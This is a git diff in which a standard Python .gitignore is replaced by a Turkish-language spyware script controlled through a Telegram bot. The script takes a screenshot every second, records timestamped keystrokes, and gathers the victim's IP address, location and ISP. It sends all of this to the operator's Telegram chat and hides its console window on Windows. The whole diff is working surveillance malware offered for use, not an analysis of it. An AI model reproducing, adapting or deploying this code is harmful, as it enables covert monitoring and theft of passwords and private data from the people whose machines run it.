@@ -1,174 +1,530 @@
-# Byte-compiled / optimized / DLL files
-__pycache__/
-*.py[cod]
-*$py.class
+import pyautogui
+import time
+import telebot
+import io
+import os
+import sys
+import threading
+from pynput.keyboard import Listener
+from datetime import datetime
+import subprocess
+import requests
+import platform
+from ipwhois import IPWhois
+import socket
+import nmap  
+from urllib.parse import urlparse
 
-# C extensions
-*.so
 
-# Distribution / packaging
-.Python
-build/
-develop-eggs/
-dist/
-downloads/
-eggs/
-.eggs/
-lib/
-lib64/
-parts/
-sdist/
-var/
-wheels/
-share/python-wheels/
-*.egg-info/
-.installed.cfg
-*.egg
-MANIFEST
 
-# PyInstaller
-#  Usually these files are written by a python script from a template
-#  before PyInstaller builds the exe, so as to inject date/other infos into it.
-*.manifest
-*.spec
+BOT_TOKEN = "YOU_BOT_TOKEN"  # @botfather
 
-# Installer logs
-pip-log.txt
-pip-delete-this-directory.txt
 
-# Unit test / coverage reports
-htmlcov/
-.tox/
-.nox/
-.coverage
-.coverage.*
-.cache
-nosetests.xml
-coverage.xml
-*.cover
-*.py,cover
-.hypothesis/
-.pytest_cache/
-cover/
+SCREENSHOT_INTERVAL = 1  
 
-# Translations
-*.mo
-*.pot
 
-# Django stuff:
-*.log
-local_settings.py
-db.sqlite3
-db.sqlite3-journal
+keylog_running = False
+keylog_thread = None
+keys = []
+keylog_send_interval = 60  
+listener = None  
 
-# Flask stuff:
-instance/
-.webassets-cache
 
-# Scrapy stuff:
-.scrapy
+bot = telebot.TeleBot(BOT_TOKEN)
 
-# Sphinx documentation
-docs/_build/
 
-# PyBuilder
-.pybuilder/
-target/
+running = False  
+sending = False  
+screenshot_thread = None  
+CHAT_ID = None  
+screenshot_queue = []  
 
-# Jupyter Notebook
-.ipynb_checkpoints
 
-# IPython
-profile_default/
-ipython_config.py
+def send_screenshot():
+    """
+    Ekran görüntüsü alır, bellekte saklar ve Telegram'a gönderir.
+    """
+    global CHAT_ID, sending, screenshot_queue
+    if CHAT_ID is None:
+        print("CHAT_ID henüz ayarlanmadı. Lütfen /start komutunu kullanın.")
+        return
 
-# pyenv
-#   For a library or package, you might want to ignore these files since the code is
-#   intended to run in multiple environments; otherwise, check them in:
-# .python-version
+    try:
+        
+        screenshot = pyautogui.screenshot()
 
-# pipenv
-#   According to pypa/pipenv#598, it is recommended to include Pipfile.lock in version control.
-#   However, in case of collaboration, if having platform-specific dependencies or dependencies
-#   having no cross-platform support, pipenv may install dependencies that don't work, or not
-#   install all needed dependencies.
-#Pipfile.lock
+      
+        image_stream = io.BytesIO()
+        screenshot.save(image_stream, format='PNG')
+        image_stream.seek(0) 
 
-# UV
-#   Similar to Pipfile.lock, it is generally recommended to include uv.lock in version control.
-#   This is especially recommended for binary packages to ensure reproducibility, and is more
-#   commonly ignored for libraries.
-#uv.lock
+       
+        if sending:  
+            bot.send_photo(chat_id=CHAT_ID, photo=image_stream)
+        else:
+            screenshot_queue.append(image_stream)  
 
-# poetry
-#   Similar to Pipfile.lock, it is generally recommended to include poetry.lock in version control.
-#   This is especially recommended for binary packages to ensure reproducibility, and is more
-#   commonly ignored for libraries.
-#   https://python-poetry.org/docs/basic-usage/#commit-your-poetrylock-file-to-version-control
-#poetry.lock
+    except Exception as e:
+        print(f"Hata oluştu: {e}")
+        
+        bot.send_message(chat_id=CHAT_ID, text=f"Ekran görüntüsü gönderilirken bir hata oluştu: {e}")
 
-# pdm
-#   Similar to Pipfile.lock, it is generally recommended to include pdm.lock in version control.
-#pdm.lock
-#   pdm stores project-wide configurations in .pdm.toml, but it is recommended to not include it
-#   in version control.
-#   https://pdm.fming.dev/latest/usage/project/#working-with-version-control
-.pdm.toml
-.pdm-python
-.pdm-build/
 
-# PEP 582; used by e.g. github.com/David-OConnor/pyflow and github.com/pdm-project/pdm
-__pypackages__/
 
-# Celery stuff
-celerybeat-schedule
-celerybeat.pid
+def screenshot_loop():
+    """
+    Ekran görüntüsü alma döngüsü. 'running' değişkeni True olduğu sürece çalışır.
+    """
+    while running:
+        send_screenshot()
+        time.sleep(SCREENSHOT_INTERVAL)
 
-# SageMath parsed files
-*.sage.py
 
-# Environments
-.env
-.venv
-env/
-venv/
-ENV/
-env.bak/
-venv.bak/
 
-# Spyder project settings
-.spyderproject
-.spyproject
+def start_screenshotting():
+    """
+    Ekran görüntüsü alma işlemini başlatır.
+    """
+    global running, screenshot_thread, CHAT_ID, sending
+    if CHAT_ID is None:
+        print("CHAT_ID henüz ayarlanmadı. Lütfen /start komutunu kullanın.")
+        return
 
-# Rope project settings
-.ropeproject
+    if not running:
+        running = True
+        sending = True  
+        screenshot_thread = threading.Thread(target=screenshot_loop)
+        screenshot_thread.daemon = True  
+        screenshot_thread.start()
+        bot.send_message(chat_id=CHAT_ID, text="Ekran görüntüsü alma başlatıldı ve gönderiliyor!")
+    else:
+        bot.send_message(chat_id=CHAT_ID, text="Ekran görüntüsü alma zaten çalışıyor!")
 
-# mkdocs documentation
-/site
 
-# mypy
-.mypy_cache/
-.dmypy.json
-dmypy.json
 
-# Pyre type checker
-.pyre/
+def stop_sending():
+    """
+    Ekran görüntüsü gönderme işlemini durdurur.
+    """
+    global sending
+    if sending:
+        sending = False
+        bot.send_message(chat_id=CHAT_ID, text="Ekran görüntüsü gönderme durduruldu! Ekran görüntüsü alınmaya devam ediliyor.")
+    else:
+        bot.send_message(chat_id=CHAT_ID, text="Ekran görüntüsü gönderme zaten durdurulmuş!")
 
-# pytype static type analyzer
-.pytype/
 
-# Cython debug symbols
-cython_debug/
 
-# PyCharm
-#  JetBrains specific template is maintained in a separate JetBrains.gitignore that can
-#  be found at https://github.com/github/gitignore/blob/main/Global/JetBrains.gitignore
-#  and can be added to the global gitignore or merged into this file.  For a more nuclear
-#  option (not recommended) you can uncomment the following to ignore the entire idea folder.
-#.idea/
+def resume_sending():
+    """
+    Ekran görüntüsü gönderme işlemini devam ettirir.
+    """
+    global sending, screenshot_queue
+    if not sending:
+        sending = True
+        bot.send_message(chat_id=CHAT_ID, text="Ekran görüntüsü gönderme devam ediyor!")
+     
+        while screenshot_queue:
+            image_stream = screenshot_queue.pop(0)
+            bot.send_photo(chat_id=CHAT_ID, photo=image_stream)
+    else:
+        bot.send_message(chat_id=CHAT_ID, text="Ekran görüntüsü gönderme zaten devam ediyor!")
 
-# Ruff stuff:
-.ruff_cache/
 
-# PyPI configuration file
-.pypirc
+
+def stop_screenshotting():
+    """
+    Ekran görüntüsü almayı durdurur.
+    """
+    global running, screenshot_thread
+    if running:
+        running = False
+        if screenshot_thread:
+            screenshot_thread.join(timeout=5)
+        bot.send_message(chat_id=CHAT_ID, text="Ekran görüntüsü alma durduruldu!")
+    else:
+        bot.send_message(chat_id=CHAT_ID, text="Ekran görüntüsü alma zaten durdurulmuş!")
+
+
+
+def on_press(key):
+    """
+    Tuşa basıldığında yapılacak işlemler.
+    """
+    global keys
+    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    keys.append((timestamp, key)) 
+
+
+
+def write_to_file(keys):
+    """
+    Tuşları bir dosyaya yazar ve Telegram'a gönderir.
+    """
+    global CHAT_ID
+    if CHAT_ID is None:
+        print("CHAT_ID henüz ayarlanmadı. Lütfen /start komutunu kullanın.")
+        return
+
+    try:
+        with open("keylog.txt", "w", encoding="utf-8") as f:
+            for timestamp, key in keys:
+                f.write(f"[{timestamp}] {key}\n")  
+
+        with open("keylog.txt", "rb") as f:
+            bot.send_document(chat_id=CHAT_ID, document=f)
+
+        os.remove("keylog.txt") 
+        keys.clear()  
+
+    except Exception as e:
+        print(f"Hata oluştu: {e}")
+        bot.send_message(chat_id=CHAT_ID, text=f"Tuş kaydı gönderilirken bir hata oluştu: {e}")
+
+
+
+def keylog_loop():
+    """
+    Tuş dinleme döngüsü.
+    """
+    global keys, keylog_running, keylog_send_interval, listener
+    
+    if listener is None:
+        listener = Listener(on_press=on_press)
+        listener.start()
+    while keylog_running:
+        time.sleep(keylog_send_interval)
+        if keys:  
+            write_to_file(keys)
+
+
+
+def start_keylogger():
+    """
+    Tuş kaydediciyi başlatır.
+    """
+    global keylog_running, keylog_thread, listener
+    if not keylog_running:
+        keylog_running = True
+        
+        keylog_thread = threading.Thread(target=keylog_loop)
+        keylog_thread.daemon = True
+        keylog_thread.start()
+        bot.send_message(chat_id=CHAT_ID, text="Tuş kaydedici başlatıldı!")
+    else:
+        bot.send_message(chat_id=CHAT_ID, text="Tuş kaydedici zaten çalışıyor!")
+
+
+
+def stop_keylogger():
+    """
+    Tuş kaydediciyi durdurur.
+    """
+    global keylog_running, keylog_thread, listener
+    if keylog_running:
+        keylog_running = False
+        if keylog_thread:
+            keylog_thread.join(timeout=5)
+        if listener:  
+            listener.stop()
+            listener = None  
+        bot.send_message(chat_id=CHAT_ID, text="Tuş kaydedici durduruldu!")
+    else:
+        bot.send_message(chat_id=CHAT_ID, text="Tuş kaydedici zaten durdurulmuş!")
+
+
+
+def get_system_info():
+    """
+    İşletim sistemi ve donanım bilgilerini alır.
+    """
+    try:
+        
+        os_info = platform.system() + " " + platform.release()
+        try:
+            os_version = platform.version()
+        except:
+            os_version = "Sürüm bilgisi alınamadı"
+
+        
+        try:
+            ip_address = requests.get('https://api.ipify.org').text
+           
+            location_data = requests.get(f'http://ip-api.com/json/{ip_address}').json()
+            city = location_data.get('city', 'Bilinmiyor')
+            region = location_data.get('regionName', 'Bilinmiyor')
+            country = location_data.get('country', 'Bilinmiyor')
+            location = f"{city}, {region}, {country}"
+        except Exception as e:
+            ip_address = "IP adresi alınamadı."
+            location = "Konum bilgisi alınamadı."
+
+       
+        try:
+            obj = IPWhois(ip_address)
+            isp = obj.lookup_rdap()['network']['name']
+        except Exception as e:
+            isp = "İnternet sağlayıcısı bulunamadı."
+
+        return os_info, os_version, ip_address, location, isp
+
+    except Exception as e:
+        return f"Hata oluştu: {e}"
+
+
+
+
+
+@bot.message_handler(commands=['start'])
+def send_welcome(message):
+    """
+    /start komutuna yanıt verir.
+    """
+    global CHAT_ID
+    CHAT_ID = message.chat.id  
+    bot.reply_to(message, """                   𝐒𝐂𝐑𝐄𝐄𝐍𝐒𝐇𝐎𝐓
+
+-----------------------------------------------------------------------------------------------------                 
+/ss Başlatır  
+
+/ssodurdur  𝗘𝗸𝗿𝗮𝗻 𝗴𝗼̈𝗿𝘂̈𝗻𝘁𝘂̈𝘀𝘂̈ 𝗴𝗼̈𝗻𝗱𝗲𝗿𝗺𝗲𝘆𝗶 𝗱𝘂𝗿𝗱𝘂𝗿𝘂𝗿
+
+/ssdevam 𝗗𝘂𝗿𝗱𝘂𝗿𝘂𝗹𝗮𝗻 𝗲𝗸𝗿𝗮𝗻 𝗴𝗼̈𝗿𝘂̈𝗻𝘁𝘂̈𝘀𝘂̈ 𝗴𝗼̈𝗻𝗱𝗲𝗿𝗺𝗲 𝗶𝘀̧𝗹𝗲𝗺𝗶𝗻𝗲 𝗱𝗲𝘃𝗮𝗺 𝗲𝗱𝗲𝗿
+
+/ssoff 𝗘𝗸𝗿𝗮𝗻 𝗴𝗼̈𝗿𝘂̈𝗻𝘁𝘂̈𝘀𝘂̈ 𝗮𝗹𝗺𝗮𝘆ı 𝘁𝗮𝗺𝗮𝗺𝗲𝗻 𝗱𝘂𝗿𝗱𝘂𝗿𝘂𝗿
+-----------------------------------------------------------------------------------------------------
+                 
+                  𝐊𝐄𝐘𝐋𝐎𝐆𝐆𝐄𝐑
+                 
+-----------------------------------------------------------------------------------------------------
+/keyon 𝗕𝗮𝘀̧𝗹𝗮𝘁ı𝗿 𝟭 𝗱𝗮𝗸𝗶𝗸𝗮 𝘀𝗼𝗻𝗿𝗮 𝗸𝗮𝘆𝗱𝗲𝗱𝗶𝗹𝗲𝗻𝗹𝗲𝗿𝗶 𝗮𝘁𝗮𝗿
+
+/keyoff 𝗞𝗮𝗽𝗮𝘁ı𝗿
+-----------------------------------------------------------------------------------------------------
+                 
+                𝐒𝐈̇𝐒𝐓𝐄𝐌 𝐁𝐈̇𝐋𝐆𝐈̇𝐋𝐄𝐑𝐈̇
+                 
+-----------------------------------------------------------------------------------------------------             
+/info 𝗦𝗶𝘀𝘁𝗲𝗺 𝗯𝗶𝗹𝗴𝗶𝗹𝗲𝗿𝗶𝗻𝗶 𝗴𝗼̈𝘀𝘁𝗲𝗿𝗶𝗿
+-----------------------------------------------------------------------------------------------------
+                 
+                𝐏𝐔𝐋𝐋𝐈̇𝐍𝐆 𝐅𝐈̇𝐋𝐄
+                 
+-----------------------------------------------------------------------------------------------------
+/pulling 𝗦𝗶𝘁𝗲 𝗸𝗼𝗽𝘆𝗮𝗹𝗮𝗺𝗮 (𝗲𝘅𝗲) 𝗽𝗮𝘀𝘀𝘄𝗼𝗿𝗱 : 𝟭𝟵𝟯𝟰
+-----------------------------------------------------------------------------------------------------     
+                           
+                   """)
+    
+
+@bot.message_handler(commands=['start'])
+def send_welcome(message):
+    """
+    /start komutuna yanıt verir.
+    """
+    global CHAT_ID
+    CHAT_ID = message.chat.id  
+    bot.reply_to(message, """       𝐷𝐸𝑇𝐴𝑌𝐿𝐼 𝐵𝐼̇𝐿𝐺𝐼̇
+                 
+
+𝐒𝐂𝐑𝐄𝐄𝐍𝐒𝐇𝐎𝐓
+                 
+-----------------------------------------------------------------------------------------------------                 
+  /ss 𝗛𝗲𝗿 𝘀𝗮𝗻𝗶𝘆𝗲 𝘀𝗰𝗿𝗲𝗲𝗻𝘀𝗵𝗼𝘁 𝗮𝗹ı𝗿 𝘃𝗲 𝘀𝗶𝘇𝗲 𝗮𝘁𝗮𝗿 
+                 
+  /ssdurdur 𝗔𝗹ı𝗻𝗮𝗻 𝘀𝗰𝗿𝗲𝗲𝗻𝘀𝗵𝗼𝘁'𝗹𝗮𝗿ı 𝘀𝗶𝘇𝗲 𝗮𝘁𝗺𝗮𝘆ı 𝗱𝘂𝗿𝗱𝘂𝗿 𝗮𝗺𝗮 𝗮𝗹𝗺𝗮𝘆𝗮 𝗱𝗲𝘃𝗮𝗺 𝗲𝗱𝗲𝗿(𝘀𝗮𝗸𝗹𝗮𝗿)
+                 
+  /ssdevam 𝗦𝗮𝗸𝗹𝗮𝗱ı 𝘀𝗰𝗿𝗲𝗲𝗻𝘀𝗵𝗼𝘁'𝗹𝗮𝗿 𝗵𝗲𝗽𝘀𝗶𝗻𝗶 𝘀𝗶𝘇𝗲 𝗮𝘁𝗮𝗿 𝗮𝘁𝘁ı𝗸𝘁𝗮𝗻 𝘀𝗼𝗻𝗿𝗮 𝘀𝗰𝗿𝗲𝗲𝗻𝘀𝗵𝗼𝘁 𝗮𝗹𝗺𝗮𝘆𝗮 𝗱𝗲𝘃𝗮𝗺 𝗲𝗱𝗲𝗿
+                 
+  /ssoff 𝗦𝗰𝗿𝗲𝗲𝗻𝘀𝗵𝗼𝘁 𝗮𝗹𝗺𝗮𝘆ı 𝘁𝗮𝗺𝗮𝗺𝗲𝗻 𝗱𝘂𝗿𝗱𝘂𝗿 
+----------------------------------------------------------------------------------------------------- 
+                                  
+𝐊𝐄𝐘𝐋𝐎𝐆𝐆𝐄𝐑
+                 
+-----------------------------------------------------------------------------------------------------                 
+  /keyon 𝗕𝗮𝘀𝘁ı 𝗵𝗲𝗿 𝘁𝘂𝘀̧𝘂 𝗸𝗮𝘆𝗱𝗲𝗱𝗲𝗿 𝘃𝗲 𝗯𝗮𝘀𝘁ı 𝗵𝗲𝗿 𝘁𝘂𝘀̧𝘂 𝗬𝗜𝗟,𝗔𝗬,𝗚𝗨̈𝗡,𝗦𝗔𝗔𝗧,𝗦𝗔𝗡𝗜̇𝗬𝗘 𝗼𝗹𝗮𝗿𝗸 𝗵𝗲𝗿 𝟭 𝗱𝗮𝗸𝗶𝗸𝗮𝗱𝗮 𝗯𝗶𝗿 𝘀𝗶𝘇𝗲 𝘁𝘅𝘁 𝗱𝗼𝘀𝘆𝗮𝘀ı𝗻𝗱𝗮 𝗮𝘁𝗮𝗿
+                  
+  /keyoff T𝘂𝘀̧ 𝗸𝗮𝘆𝗱𝗲𝘁𝗺𝗲𝘆𝗶 𝘁𝗮𝗺𝗮𝗺𝗲𝗻 𝗱𝘂𝗿𝗱𝘂𝗿
+----------------------------------------------------------------------------------------------------- 
+                                                 
+𝐒𝐈̇𝐒𝐓𝐄𝐌 𝐁𝐈̇𝐋𝐆𝐈̇𝐋𝐄𝐑𝐈̇
+                 
+-----------------------------------------------------------------------------------------------------                   
+  /info 𝗜̇𝘀̧𝗹𝗲𝘁𝗶𝗺 𝗦𝗶𝘀𝘁𝗲𝗺𝗶𝗻𝗶 
+         𝗜̇𝘀̧𝗹𝗲𝘁𝗶𝗺 𝗦𝘂̈𝗿𝘂̈𝗺𝘂̈𝗻𝘂̈
+         𝗜𝗽 𝗔𝗱𝗿𝗲𝘀𝗶𝗻𝗶
+         𝗬𝗮𝘀̧𝗮𝗱ı 𝗬𝗲𝗿𝗶 (𝗜̇𝗟𝗖̧𝗘 , 𝗜̇𝗟 , 𝗨̈𝗟𝗞𝗘)
+         𝗜̇𝗻𝘁𝗲𝗿𝗻𝗲𝘁 𝗦𝗮𝗴̆𝗹𝗮𝘆ı𝗰ı𝘀ı 
+                 
+         𝕊𝕚𝕫𝕖 𝕥𝕩𝕥 𝕕𝕠𝕤𝕪𝕒𝕤ı 𝕠𝕝𝕒𝕣𝕒𝕜 𝕒𝕥𝕒𝕣
+-----------------------------------------------------------------------------------------------------  
+                                  
+𝐏𝐔𝐋𝐋𝐈̇𝐍𝐆 𝐅𝐈̇𝐋𝐄
+                 
+-----------------------------------------------------------------------------------------------------                 
+  /pulling 𝗘𝘅𝗲 𝗱𝗼𝘀𝘆𝗮𝘀ı𝗻ı 𝗮𝗰̧𝘁ı𝗻ı𝘇 𝘇𝗮𝗺𝗮𝗻 𝘀𝗶𝘇𝗱𝗲𝗻 𝘀̧𝗶𝗳𝗿𝗲 𝗶𝘀𝘁𝗶𝗰𝗲𝗸𝘁𝗶𝗿 (𝟭𝟵𝟯𝟰) 𝗱𝗮𝗵𝗮 𝘀𝗼𝗻𝗿𝗮 𝗸𝗮𝘆𝗻𝗮𝗸 𝗸𝗼𝗱𝗹𝗮𝗿ı𝗻ı 𝗶𝗻𝗱𝗶𝗿𝗺𝗲𝗸 𝗶𝘀𝘁𝗲𝗱𝗶𝗻𝗶𝘇 𝘀𝗶𝘁𝗲𝗻𝗶𝗻 𝗨𝗥𝗟 𝘀𝗶𝗻𝗶 𝗴𝗶𝗿𝗶𝗽 𝗲𝗻𝘁𝗲𝗿 𝗯𝗮𝘀𝘁ı𝗻ı𝘇 𝘇𝗮𝗺𝗮𝗻 𝗶𝗻𝗱𝗶𝗿𝗺𝗲𝘆𝗲 𝗯𝗮𝘀̧𝗹𝗮𝗿 𝗶𝗻𝗱𝗶𝗿𝗺𝗲 𝗯𝗶𝘁𝘁𝗶 𝘇𝗮𝗺𝗮𝗻 𝗺𝗮𝘀𝗮𝘂̈𝘀𝘁𝘂̈𝗻𝘂̈𝘇𝗲 𝗸𝗹𝗮𝘀𝗼̈𝗿 𝗶𝗰̧𝗶𝗻𝗱𝗲 𝗼𝗻𝗹𝗮𝗿ı 𝗸𝗮𝘆𝗱𝗲𝗱𝗲𝗿
+            
+                  !!! ℍ𝔼ℝ𝕊̧𝔼𝕐𝕀̇ 𝕋𝔸𝕄 𝕆𝕃𝔸ℝ𝔸𝕂 𝕀̇ℕ𝔻𝕀̇ℝ𝔼𝕄𝔼ℤ !!!
+-----------------------------------------------------------------------------------------------------
+                                                                                                𝓮𝓼𝔀𝓻  """)   
+
+
+
+@bot.message_handler(commands=['ss'])
+def handle_ss_command(message):
+    """
+    /ss komutuna yanıt verir ve ekran görüntüsü almayı başlatır.
+    """
+    start_screenshotting()
+    global sending
+    sending = True  
+
+
+
+
+@bot.message_handler(commands=['ssoff'])
+def handle_ssoff_command(message):
+    """
+    /ssoff komutuna yanıt verir ve ekran görüntüsü göndermeyi durdurur.
+    """
+    stop_sending()
+
+
+
+
+@bot.message_handler(commands=['sscontinue'])
+def handle_sscontinue_command(message):
+    """
+    /sscontinue komutuna yanıt verir ve ekran görüntüsü göndermeyi devam ettirir.
+    """
+    resume_sending()
+
+
+
+
+@bot.message_handler(commands=['ssclose'])
+def handle_ssclose_command(message):
+    """
+    /ssclose komutuna yanıt verir ve ekran görüntüsü almayı durdurur.
+    """
+    stop_screenshotting()
+
+
+
+
+@bot.message_handler(commands=['keyon'])
+def handle_keyon_command(message):
+    """
+    /keyon komutuna yanıt verir ve tuş kaydediciyi başlatır.
+    """
+    start_keylogger()
+
+
+
+
+@bot.message_handler(commands=['keyoff'])
+def handle_keyoff_command(message):
+    """
+    /keyoff komutuna yanıt verir ve tuş kaydediciyi durdurur.
+    """
+    stop_keylogger()
+
+
+
+
+@bot.message_handler(commands=['info'])
+def handle_info_command(message):
+    """
+    /info komutuna yanıt verir ve sistem bilgilerini gönderir.
+    """
+    global CHAT_ID
+    if CHAT_ID is None:
+        print("CHAT_ID henüz ayarlanmadı. Lütfen /start komutunu kullanın.")
+        return
+
+    system_info = get_system_info()
+    if isinstance(system_info, str):  
+        bot.send_message(chat_id=CHAT_ID, text=system_info)
+    else:
+        os_info, os_version, ip_address, location, isp = system_info
+        info_message = f"""
+İşletim Sistemi: {os_info}
+İşletim Sistemi Sürümü: {os_version}
+IP Adresi: {ip_address}
+Konum: {location}
+İnternet Sağlayıcısı: {isp}
+"""
+        bot.send_message(chat_id=CHAT_ID, text=info_message)
+
+
+EXE_FILE_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "pulling_file.exe")
+
+@bot.message_handler(commands=['pulling'])
+def handle_go_command(message):
+    """
+    /go komutuna yanıt verir ve belirlenen exe dosyasını gönderir.
+    """
+    global CHAT_ID
+    if CHAT_ID is None:
+        print("CHAT_ID henüz ayarlanmadı. Lütfen /start komutunu kullanın.")
+        return
+
+    try:
+        with open(EXE_FILE_PATH, "rb") as exe_file: 
+            bot.send_document(chat_id=CHAT_ID, document=exe_file, caption="İşte istediğiniz dosya!")
+    except FileNotFoundError:
+        bot.send_message(chat_id=CHAT_ID, text="EXE dosyası bulunamadı. Lütfen dosya yolunu kontrol edin.")
+    except Exception as e:
+        bot.send_message(chat_id=CHAT_ID, text=f"Dosya gönderilirken bir hata oluştu: {e}")
+
+
+
+def main():
+    """
+    Ana fonksiyon. Botu başlatır ve olay döngüsünü çalıştırır.
+    """
+   
+    if os.name == "nt":
+        import ctypes
+        
+        def show_console():
+            hwnd = ctypes.windll.kernel32.GetConsoleWindow()
+            if hwnd != 0:
+                ctypes.windll.user32.ShowWindow(hwnd, 1)  
+
+       
+        def register_hotkey():
+            if not ctypes.windll.user32.RegisterHotKey(None, 1, 0x0004 | 0x0008 | 0x0002, 0x53):
+                print("Hotkey kaydı başarısız oldu.")
+                return False
+            return True
+
+        
+        def listen_for_hotkey():
+            msg = ctypes.wintypes.MSG()
+            while ctypes.windll.user32.GetMessageW(ctypes.byref(msg), None, 0, 0) != 0:
+                if msg.message == 0x0100: 
+                    if msg.wParam == 0x53 and msg.lParam >> 16 & 0x0001:  
+                        show_console()
+                ctypes.windll.user32.TranslateMessage(ctypes.byref(msg))
+                ctypes.windll.user32.DispatchMessageW(ctypes.byref(msg))
+
+        if register_hotkey():
+            
+            hotkey_thread = threading.Thread(target=listen_for_hotkey)
+            hotkey_thread.daemon = True
+            hotkey_thread.start()
+
+            
+            hwnd = ctypes.windll.kernel32.GetConsoleWindow()
+            if hwnd != 0:
+                ctypes.windll.user32.ShowWindow(hwnd, 0)  
+
+    
+    bot.polling(none_stop=True)
+
+
+
+if __name__ == "__main__":
+    main()
+
